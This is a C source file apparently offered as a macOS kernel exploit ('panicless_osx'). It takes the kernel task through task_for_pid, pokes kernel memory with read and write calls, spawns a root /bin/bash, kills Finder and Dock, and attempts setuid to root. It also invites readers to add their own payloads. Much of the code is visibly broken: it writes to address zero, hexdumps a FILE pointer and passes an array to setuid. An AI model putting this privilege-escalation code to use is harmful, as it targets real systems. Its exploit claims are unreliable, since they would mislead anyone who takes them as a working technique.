//
//  postExploit.c
//  panicless_osx
//
//  Created by ali on 2.03.2021.
//

#include "postExploit.h"
#include <spawn.h>
#define PANIC_LOG(fmt)\
printf("[panicless_osx] ");\
printf(fmt);\
printf("\n");

#define msleep(time)\
sleep(time);

thread_state_t ppc_state;
mach_msg_type_number_t sc = MACHINE_THREAD_STATE_COUNT;
long thread = 0; // for first thread

uint64_t task_f;
// For debugging
int hexdump(const void* data, size_t size) {
  char ascii[17];
  size_t i, j;
  ascii[16] = '\0';
  for (i = 0; i < size; ++i) {
    printf("%02X ", ((unsigned char*)data)[i]);
    if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
      ascii[i % 16] = ((unsigned char*)data)[i];
    } else {
      ascii[i % 16] = '.';
    }
    if ((i+1) % 8 == 0 || i+1 == size) {
      printf(" ");
      if ((i+1) % 16 == 0) {
        printf("|  %s \n", ascii);
      } else if (i+1 == size) {
        ascii[(i+1) % 16] = '\0';
        if ((i+1) % 16 <= 8) {
          printf(" ");
        }
        for (j = (i+1) % 16; j < 16; ++j) {
          printf("   ");
        }
        printf("|  %s \n", ascii);
      }
    }
  }
    return (int)ascii;
}
extern char **environ;
char mach_exec(char *cmd){
    pid_t pid;
    char *argv[] = {"sh", "-c", cmd, NULL};
    int status;
    status = posix_spawn(&pid, "/bin/sh", NULL, NULL, argv, environ);
    return status;
}

mach_port_t createPort(){
  
    //printf("[msg] creating a fake task\n");
    mach_port_t    kernel_task;
            kern_return_t  err;
            long           value = 0;
     
    PANIC_LOG("lets move in the dangly sketchy exploit");
    //FindKernelBase(); not yet takes time long as hell
            err = task_for_pid(mach_task_self(),0,&kernel_task);
            if ((err != KERN_SUCCESS) || !MACH_PORT_VALID(kernel_task))
                PANIC_LOG("getting kernel task.");
            // Write values to stack.
            if(vm_write(kernel_task, (vm_address_t) 0x0, (vm_address_t)&value, 10))
                        PANIC_LOG("writing argument to dlopen.");
    
            printf("[+] done!\n");
    task_f=mach_task_self()|0x100000;
    return kernel_task;
}


int sandbox=1;
int exploit(void){
    mach_port_t fake_task=createPort();
   
        
        // after we return to userland our process state is super messed up
        // in order to be able to get a "stable" environment
        // our userland shellcode will just exec() itself again as root
        if(getuid() == 0) {
            puts("[+] Userland shellcode says hi!");
            printf("[*] Patched uid=0x%x euid=0x%x gid=0x%x egid=0x%x\n", getuid(), geteuid(), getgid(), getegid());
            system("/bin/bash");
            exit(0);
        }
    PANIC_LOG("exploring fake kernel_task abilities");
    msleep(2);
   
    printf("[exploit] kernel_task %s\n", mach_error_string(fake_task));
    printf("[+] kernel_task -> 0x%llu\n",task_f);
    uint32_t spray=0x0fffffff;
    uint64_t spray64=100;
    k_write32(fake_task, 0x2000|0x100000, spray);
    k_write64(fake_task, 0x2000, spray64);
    
    
    /*/
     ARBITARY READ MEMORY LEAK
    /*/
    
    k_read32(fake_task, 0x1337, 10);
    k_read32(fake_task, 0x2337, 10);
    
    /*/
     ALL DONE SENDS YOU HERE
    /*/
    
    PANIC_LOG("fun part here (lets have some fun?)");
    printf("info -> %d\n",k_read32(fake_task, 0x120|0x1000000, 10));
    
    printf("info -> %d\n",k_read32(fake_task, 0x420|0x1000000, 10));
    printf("info -> %d\n",k_read32(fake_task, 0x120|0x1000000, 10));
    printf("info -> %d\n",k_read32(fake_task, 0x3483, 10));
    
    k_write32(fake_task, 0x3483, 0x20);
    printf("info -> %d\n",k_read32(fake_task, 0x3483, 10));
    
    uint32_t wefun=k_read32(fake_task, 0x3483, 10);
    uint32_t wefun_pac=wefun|0x0ffffff;
    printf("[*] wefun -> 0x%u\n",wefun);
    printf("[*] wefun_pac -> 0x%u\n",wefun_pac);
    
    /*/
     WF_PAC TESTING
    /*/
    
    printf("wefun_pac_orig -> %d\n",k_read32(fake_task, wefun_pac+0x10, 8));
    k_write32(fake_task, wefun_pac+0x10, 0x1337); // PATCH IT
    printf("wefun_pac_patched -> %d\n",k_read32(fake_task, wefun_pac+0x10, 8));
    FILE*kernal=fopen("/System/Library/Kernels/kernel", "r");
    if(kernal){
       
        sandbox=0; //return kernel (r/w) possibility
    }
    if(!sandbox){
        PANIC_LOG("fkkk looks good.");
        msleep(1);
        printf("kernel r/w perms -> ");
        system("stat -f \"%OLp\" /System/Library/Kernels/kernel");
        PANIC_LOG("OK.");
    }
    PANIC_LOG("SOME DATA FROM KERNEL...");
    hexdump(kernal+90, 60);
    fclose(kernal); //MAKE SURE WE FREE THE KERNEL AFTER READING SOME DATA.
    
    
    printf("[+] kernel page size -> 0x");
    system("wc -c /System/Library/Kernels/kernel | awk '{print $1}'");
    printf("\n");
  
    
    /*/
     IMPLEMENT OTHER STUFF YOURSELF
     K_READ32 IS ABIT DANGLY FOR NOW.
     GONNA MAKE A WRITEUP FOR IT.
    /*/
    
    PANIC_LOG("ADD YOUR STUFF HERE\n");
    printf("[+] our proc running outta xcode sandbox");
    printf("\n");
    mach_exec("echo [proc] we have spwned an shell into a nut.");
    mach_exec("echo [proc] oh yeah feels better we can do our stuff freely");
    
    /*/
     IN HERE I'LL RESTART FINDER AKA backboardd ON iOS
    /*/
    
    mach_exec("killall Finder");
    printf("[+] restarted backboard...\n"); //sigkill finder -> free the finder
    mach_exec("killall Dock"); //sigkill dock -> free the dock
    setruid(0); //hardcoded uid stuff setting to free userland.
    setrgid(0);
    setusershell();
    uint32_t creds[5]={0,0,0,1,0};
    setuid(creds);
    printf("[+] uid %u\n",getuid());
    if(getuid()==501){
        printf("[+] evaluating in userland not gone right. gonna fix this\n");
    }
    
    return (int)fake_task;
}
